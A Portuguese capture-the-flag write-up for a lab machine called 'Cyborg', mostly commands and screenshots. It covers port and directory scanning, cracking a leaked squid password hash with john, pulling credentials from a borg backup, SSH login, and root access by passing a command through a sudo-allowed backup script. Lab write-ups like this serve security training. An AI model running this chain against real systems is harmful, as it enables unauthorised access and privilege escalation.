# Cyborg

* ### Scan de portas - Verificando quais portas estão abertas.
  
```bash
rustscan -a 10.10.124.91
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4cba628e-81c4-45c4-8a2c-90bf8db115a9)

![image](https://github.com/lufffe/Writeups/assets/90646635/714272e1-f712-47f1-810c-bfdcb8b2c5f4)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.124.91
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6b1ef517-8b4b-493d-a757-c1b60a696301)

* ### Scan Arquivos e Diretorios.
```bash
gobuster dir -u http://10.10.124.91 -w ~/common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/25acc6c1-3b75-4536-80b4-65a038a28d7e)

* ### Olhando o Http.
![image](https://github.com/lufffe/Writeups/assets/90646635/ca191423-c93e-4a57-b8e3-943d08208646)

* ### Credenciais.
http://10.10.124.91/etc/squid/passwd

![image](https://github.com/lufffe/Writeups/assets/90646635/a66e5032-dfea-4181-b887-760695099863)

```bash
john --wordlist=~/rockyou.txt hash
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9f6b321e-7ad4-489c-affe-e80ffbed412b)

* ### Baixe o arquivo no link - no menu download
http://10.10.124.91/admin/

* ### Extraindo arquivo baixado.
```bash
7z x archive.tar
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ddcd0615-33ba-4a4d-8169-c5577b5005ff)

* ### Lendo arquivo encontrado.
```bash
┌──(luffe㉿Kalizin)-[~/…/home/field/dev/final_archive]
└─$ cat README
```
![image](https://github.com/lufffe/Writeups/assets/90646635/929760ea-35d0-4522-81a2-aa34ef2450dd)

* ### Extraindo arquivo do borg.
```bash
borgbackup extract home/field/dev/final_archive::music_archive
```
![image](https://github.com/lufffe/Writeups/assets/90646635/59c33c46-18b7-404d-a763-6c285b0352ad)

* ### Lendo arquivo nas pastas do usário Alex.
```bash
cat note.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9e7ac6e3-af64-403d-9c71-655c61ed748d)

* ### Acessando via SSH com credenciais encontradas.
```bash
ssh alex@10.10.124.91
```
* ### Flag Usuário
```bash
alex@ubuntu:~$ cat user.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/98114ca8-09aa-47a3-9aca-b3f1d9d69ba1)

```bash
alex@ubuntu:~$ sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2203909b-308f-46ff-84db-765fba1273d8)

```bash
alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/cc27a0cf-8429-4953-a2fa-4aa15d3aaf60)

* ### Flag Root
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
![image](https://github.com/lufffe/Writeups/assets/90646635/90ccc2af-68aa-4c27-8bb6-8198be3e2b57)
